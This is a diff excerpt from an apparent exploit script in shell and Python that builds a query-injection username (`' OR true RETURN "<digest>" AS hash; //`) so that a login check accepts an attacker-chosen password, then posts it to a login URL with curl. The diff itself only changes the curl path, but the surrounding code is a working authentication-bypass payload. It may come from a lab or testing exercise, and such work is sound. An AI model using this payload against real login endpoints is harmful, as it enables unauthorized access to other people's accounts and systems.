@@ -25,7 +25,7 @@ digest = hashlib.sha1(password).hexdigest()
 username = f"' OR true RETURN \"{digest}\" AS hash; //"
 json.dump({sys.argv[2]: username, sys.argv[3]: password.decode('utf-8')}, sys.stdout)
 PY
-curl --silent --show-error --connect-timeout 5 --max-time 30 \
+/usr/bin/curl --silent --show-error --connect-timeout 5 --max-time 30 \
   --header 'Content-Type: application/json' --data-binary "@$request_json" \
   --dump-header "$headers" --output "$body" --write-out 'status=%{http_code}\n' "$login_url"
 ~~~
